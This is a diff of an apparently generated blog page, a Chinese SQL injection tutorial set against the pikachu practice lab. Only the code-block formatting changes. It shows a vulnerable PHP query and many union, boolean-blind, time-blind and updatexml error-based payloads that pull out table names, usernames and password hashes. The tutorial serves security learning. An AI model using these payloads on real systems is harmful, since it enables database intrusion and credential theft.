@@ -530,10 +530,11 @@
             <div id="articleContent">
                 <h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p>
 <p>&emsp;&emsp;一般情况下，程序开发者会使用动态SQL语句。动态SQL语句是在执行过程中构造的，它根据不同的条件产生不同的SQL语句，这种创建SQL语句的方式具有很大的灵活性。但动态创建SQL语句时，需要特别注意注入的产生，例如下面的PHP代码：</p>
-<pre><code class="php">$id=$_POST[&#39;id&#39;];
-$query=&quot;select username,email from member where id=$id&quot;;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$id=$_POST[<span class="hljs-string">'id'</span>];<br>$query=<span class="hljs-string">"select username,email from member where id=$id"</span>;<br></code></pre></td></tr></table></figure>
+
 <p>&emsp;&emsp;由于这里的的参数<code>id</code>可控，且带入数据库执行查询操作，所以非法用户可以拼接SQL语句对数据库进行恶意操作。例如当<code>id = -1 union select user(),database()#</code>时，在MySQL中执行的SQL语句如下：</p>
-<pre><code class="mysql">select username,email from member where id=-1 union select user(),database()#&#39;</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select username,email from member where id=-1 union select user(),database()#&apos;<br></code></pre></td></tr></table></figure>
+
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/注入语句在MySQL中的直接结果.png" alt="注入语句在MySQL中的直接结果"></center>
 
 
@@ -582,13 +583,8 @@ $query=&quot;select username,email from member where id=$id&quot;;</code></pre>
 
 
 <h1 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h1><p>​        <code>union</code>操作符用于合并两个或多个SQL语句，得到<strong>联合查询结果</strong>。以<code>pikachu</code>平台的数据库为例，输入<code>select id，email from member where username=&#39;vince&#39; union select username,pw from member where id=1;</code>查询结果如下：</p>
-<pre><code class="mysql">+-------+----------------------------------+
-| id    | email                            |
-+-------+----------------------------------+
-| 1     | vince@pikachu.com                |
-| vince | e10adc3949ba59abbe56e057f20f883e |
-+-------+----------------------------------+
-2 rows in set (0.00 sec)</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">+-------+----------------------------------+<br>| id    | email                            |<br>+-------+----------------------------------+<br>| 1     | vince@pikachu.com                |<br>| vince | e10adc3949ba59abbe56e057f20f883e |<br>+-------+----------------------------------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
+
 <p>​        返回<code>pikachu</code>平台，在搜索型注入中，输入如下payload，出现如下报错。</p>
 <p><code>v&#39; union select username,pw from member where id=1#%</code></p>
 <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/直接在浏览中使用union查询时出现错误.png">
@@ -674,18 +670,17 @@ $query=&quot;select username,email from member where id=$id&quot;;</code></pre>
 <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/boolean盲注解析.png">
 
 <p>拼接SQL语句为：</p>
-<pre><code class="mysql"># 爆数据库名称长度
-select id,email from member where username=&#39;vince&#39; and length(database()) &lt; 3#&#39;</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 爆数据库名称长度<br>select id,email from member where username=&apos;vince&apos; and length(database()) &lt; 3#&apos;<br></code></pre></td></tr></table></figure>
+
+
+
 </li>
 </ol>
 <ol start="2">
 <li><p><strong>爆数据库名称</strong>（<font color="blue">一个字母一个字母得爆</font>）</p>
 <p>获取数据库名称长度后，使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数来逐个字母判断数据库的名称，可构造payload：</p>
-<pre><code class="mysql"># 直接匹配字符
-vince&#39; and substr(database(),1,1)=&#39;p&#39;#
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 直接匹配字符<br>vince&apos; and substr(database(),1,1)=&apos;p&apos;#<br><br># 匹配字符的ASCII<br>vince&apos; and ascii(substr(database(),1,1))=112#<br></code></pre></td></tr></table></figure>
 
-# 匹配字符的ASCII
-vince&#39; and ascii(substr(database(),1,1))=112#</code></pre>
 <p>操作结果如下所示。</p>
 <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/boolean盲注爆数据库名称.png">
 
@@ -694,17 +689,12 @@ vince&#39; and ascii(substr(database(),1,1))=112#</code></pre>
 <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/boolean盲注解析.png">
 
 <p>拼接SQL语句为：</p>
-<pre><code class="mysql"># 爆数据库名称
-select id,email from member where username=&#39;vince&#39; and ascii(substr(database(),1,1))=112#&#39;</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 爆数据库名称<br>select id,email from member where username=&apos;vince&apos; and ascii(substr(database(),1,1))=112#&apos;<br></code></pre></td></tr></table></figure>
 </li>
 <li><p><strong>爆数据表名称</strong></p>
 <p>由以上操作得到数据库名称<code>pikachu</code>后，还要继续使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数结合<code>union select</code>来爆数据表的名称信息。可构造payload如下：</p>
-<pre><code class="mysql"># 直接匹配字符
-vince&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1),1,1)=&#39;p&#39;#
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 直接匹配字符<br>vince&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;pikachu&apos; limit 0,1),1,1)=&apos;p&apos;#<br><br># 匹配字符的ASCII<br>vince&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;pikachu&apos; limit 0,1),1,1))=112#<br>vince&apos; and ord(substr((select table_name from information_schema.tables where table_schema=&apos;pikachu&apos; limit 0,1),1,1))=112#<br></code></pre></td></tr></table></figure>
 
-# 匹配字符的ASCII
-vince&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1),1,1))=112#
-vince&#39; and ord(substr((select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1),1,1))=112#</code></pre>
 <p>操作结果如下图所示：</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Boolean注入-爆数据表名称首字母h.png" alt="Boolean注入-爆数据表名称首字母h"></center>
 
@@ -712,12 +702,8 @@ vince&#39; and ord(substr((select table_name from information_schema.tables wher
 </li>
 <li><p><strong>爆users表字段名称</strong></p>
 <p>由以上操作得到数据表名称<code>users</code>后，还要继续使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数结合<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p>
-<pre><code class="mysql"># 直接匹配字符
-vince&#39; and substr((select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 0,1),1,1)=&#39;p&#39;#
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 直接匹配字符<br>vince&apos; and substr((select column_name from information_schema.columns where table_schema=&apos;pikachu&apos; and table_name=&apos;users&apos; limit 0,1),1,1)=&apos;p&apos;#<br><br># 匹配字符的ASCII<br>vince&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;pikachu&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=112#<br>vince&apos; and ord(substr((select column_name from information_schema.columns where table_schema=&apos;pikachu&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=112#<br></code></pre></td></tr></table></figure>
 
-# 匹配字符的ASCII
-vince&#39; and ascii(substr((select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=112#
-vince&#39; and ord(substr((select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=112#</code></pre>
 <p>操作结果如下图所示：</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Boolean注入-爆数据表字段名称.png" alt="Boolean注入-爆数据表字段名称"></center>
 
@@ -725,12 +711,8 @@ vince&#39; and ord(substr((select column_name from information_schema.columns wh
 </li>
 <li><p><strong>爆users表字段值</strong></p>
 <p>由以上操作得知<code>users</code>表存在<code>username</code>和<code>password</code>字段后，还要继续使用<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数结合<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p>
-<pre><code class="mysql"># 直接匹配字符
-vince&#39; and substr((select username from users limit 0,1),1,1)=&#39;p&#39;#
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 直接匹配字符<br>vince&apos; and substr((select username from users limit 0,1),1,1)=&apos;p&apos;#<br><br># 匹配字符的ASCII<br>vince&apos; and ascii(substr((select username from users limit 0,1),1,1))=112#<br>vince&apos; and ord(substr((select username from users limit 0,1),1,1))=112#<br></code></pre></td></tr></table></figure>
 
-# 匹配字符的ASCII
-vince&#39; and ascii(substr((select username from users limit 0,1),1,1))=112#
-vince&#39; and ord(substr((select username from users limit 0,1),1,1))=112#</code></pre>
 <p>操作结果如下图所示：</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Boolean注入-爆admin用户名.png" alt="Boolean注入-爆admin用户名"></center>
 
@@ -760,20 +742,14 @@ vince&#39; and ord(substr((select username from users limit 0,1),1,1))=112#</cod
 <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/基于时间盲注解析.png">
 
 <p>拼接的SQL语句为：</p>
-<pre><code class="mysql"># 检测注入点是否存在
-select id,email from member where username=&#39;vince&#39; and sleep(5)#&#39;
-# 爆数据库名称
-select id,email from member where username=&#39;vince&#39; and if(substr(database(),1,1)=&#39;p&#39;,sleep(5),null)#&#39;</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 检测注入点是否存在<br>select id,email from member where username=&apos;vince&apos; and sleep(5)#&apos;<br># 爆数据库名称<br>select id,email from member where username=&apos;vince&apos; and if(substr(database(),1,1)=&apos;p&apos;,sleep(5),null)#&apos;<br></code></pre></td></tr></table></figure>
+
 <p>以此类推继续爆破得到数据库名为：<code>pikachu</code>，接下来继续爆破数据库中的表名。</p>
 </li>
 <li><p><strong>爆数据表名称</strong></p>
 <p>由以上操作得到数据库名称<code>pikachu</code>后，还要继续使用<code>if</code>判断语句结合<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数以及<code>union select</code>来爆数据表的名称信息。可构造payload如下：</p>
-<pre><code class="mysql"># 直接匹配字符
-vince&#39; and if(substr((select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1),1,1)=&#39;p&#39;,sleep(5),null)#
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 直接匹配字符<br>vince&apos; and if(substr((select table_name from information_schema.tables where table_schema=&apos;pikachu&apos; limit 0,1),1,1)=&apos;p&apos;,sleep(5),null)#<br><br># 匹配字符的ASCII<br>vince&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&apos;pikachu&apos; limit 0,1),1,1))=112,sleep(5),null)#<br>vince&apos; and if(ord(substr((select table_name from information_schema.tables where table_schema=&apos;pikachu&apos; limit 0,1),1,1))=112,sleep(5),null)#<br></code></pre></td></tr></table></figure>
 
-# 匹配字符的ASCII
-vince&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1),1,1))=112,sleep(5),null)#
-vince&#39; and if(ord(substr((select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1),1,1))=112,sleep(5),null)#</code></pre>
 <p>操作结果如下图所示：</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆httpinfo表名1.png" alt="Time注入-爆httpinfo表名1"></center>
 
@@ -783,12 +759,8 @@ vince&#39; and if(ord(substr((select table_name from information_schema.tables w
 </li>
 <li><p><strong>爆users表字段名称</strong></p>
 <p>由以上操作得到数据表名称<code>users</code>后，还要继续使用<code>if</code>判断语句结合<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数以及<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p>
-<pre><code class="mysql"># 直接匹配字符
-vince&#39; and if(substr((select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 0,1),1,1)=&#39;p&#39;,sleep(5),null)#
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 直接匹配字符<br>vince&apos; and if(substr((select column_name from information_schema.columns where table_schema=&apos;pikachu&apos; and table_name=&apos;users&apos; limit 0,1),1,1)=&apos;p&apos;,sleep(5),null)#<br><br># 匹配字符的ASCII<br>vince&apos; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;pikachu&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=112,sleep(5),null)#<br>vince&apos; and if(ord(substr((select column_name from information_schema.columns where table_schema=&apos;pikachu&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=112,sleep(5),null)#<br></code></pre></td></tr></table></figure>
 
-# 匹配字符的ASCII
-vince&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=112,sleep(5),null)#
-vince&#39; and if(ord(substr((select column_name from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=112,sleep(5),null)#</code></pre>
 <p>操作结果如下图所示：</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段名称失败.png" alt="Time注入-爆字段名称失败"></center>
 
@@ -798,12 +770,8 @@ vince&#39; and if(ord(substr((select column_name from information_schema.columns
 </li>
 <li><p><strong>爆users表字段值</strong></p>
 <p>由以上操作得知<code>users</code>表存在<code>username</code>和<code>password</code>字段后，还要继续使用<code>if</code>判断语句结合<code>substr()</code>和<code>ascii()</code>/<code>ord()</code>函数以及<code>union select</code>来爆<code>users</code>的字段名称。可构造payload如下：</p>
-<pre><code class="mysql"># 直接匹配字符
-vince&#39; and if(substr((select username from users limit 0,1),1,1)=&#39;p&#39;,sleep(5),null)#
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 直接匹配字符<br>vince&apos; and if(substr((select username from users limit 0,1),1,1)=&apos;p&apos;,sleep(5),null)#<br><br># 匹配字符的ASCII<br>vince&apos; and if(ascii(substr((select username from users limit 0,1),1,1))=112,sleep(5),null)#<br>vince&apos; and if(ord(substr((select username from users limit 0,1),1,1))=112,sleep(5),null)#<br></code></pre></td></tr></table></figure>
 
-# 匹配字符的ASCII
-vince&#39; and if(ascii(substr((select username from users limit 0,1),1,1))=112,sleep(5),null)#
-vince&#39; and if(ord(substr((select username from users limit 0,1),1,1))=112,sleep(5),null)#</code></pre>
 <p>操作结果如下图所示：</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/Time注入-爆字段值失败.png" alt="Time注入-爆字段值失败"></center>
 
@@ -952,24 +920,8 @@ vince&#39; and if(ord(substr((select username from users limit 0,1),1,1))=112,sl
 </ul>
 <p><strong>解析</strong>：</p>
 <p>拼接的SQL语句为：</p>
-<pre><code class="mysql"># 爆数据库版本信息
-select username,id,email from member where username like &#39;%x&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#%&#39;
-# 爆当前用户信息
-select username,id,email from member where username like &#39;%x&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)#%&#39;
-# 爆当前数据库名称信息
-select username,id,email from member where username like &#39;%x&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#%&#39;
-# 爆数据库中表信息
-select username,id,email from member where username like &#39;%x&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 3,1),0x7e),1)#%&#39;
-# 爆数据表中字段名信息
-select username,id,email from member where username like &#39;%x&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x7e),1)#%&#39;
-# 爆数据表中字段值信息
-select username,id,email from member where username like &#39;%x&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#%&#39;
-# 爆password字段值前16位
-select username,id,email from member where username like &#39;%x&#39; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),1,16),0x7e),1)#%&#39;
-# 爆password字段值后16位
-select username,id,email from member where username like &#39;%x&#39; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),17,16),0x7e),1)#%&#39;
-# 同时爆username和password字段值
-select username,id,email from member where username like &#39;%x&#39; and updatexml(0x7e,concat(0x7e,((select concat(username,0x7e,password) from users limit 0,1))),0)#%&#39;</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 爆数据库版本信息<br>select username,id,email from member where username like &apos;%x&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#%&apos;<br># 爆当前用户信息<br>select username,id,email from member where username like &apos;%x&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1)#%&apos;<br># 爆当前数据库名称信息<br>select username,id,email from member where username like &apos;%x&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#%&apos;<br># 爆数据库中表信息<br>select username,id,email from member where username like &apos;%x&apos; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;pikachu&apos; limit 3,1),0x7e),1)#%&apos;<br># 爆数据表中字段名信息<br>select username,id,email from member where username like &apos;%x&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),0x7e),1)#%&apos;<br># 爆数据表中字段值信息<br>select username,id,email from member where username like &apos;%x&apos; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#%&apos;<br># 爆password字段值前16位<br>select username,id,email from member where username like &apos;%x&apos; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),1,16),0x7e),1)#%&apos;<br># 爆password字段值后16位<br>select username,id,email from member where username like &apos;%x&apos; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),17,16),0x7e),1)#%&apos;<br># 同时爆username和password字段值<br>select username,id,email from member where username like &apos;%x&apos; and updatexml(0x7e,concat(0x7e,((select concat(username,0x7e,password) from users limit 0,1))),0)#%&apos;<br></code></pre></td></tr></table></figure>
+
 <h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h1 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h1><h1 id="Base64注入"><a href="#Base64注入" class="headerlink" title="Base64注入"></a>Base64注入</h1><h1 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h1>
             </div>
             <hr/>
@@ -1606,7 +1558,7 @@ select username,id,email from member where username like &#39;%x&#39; and update
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">207.6k</span>&nbsp;字
+                class="white-color">203.2k</span>&nbsp;字
             
             
             
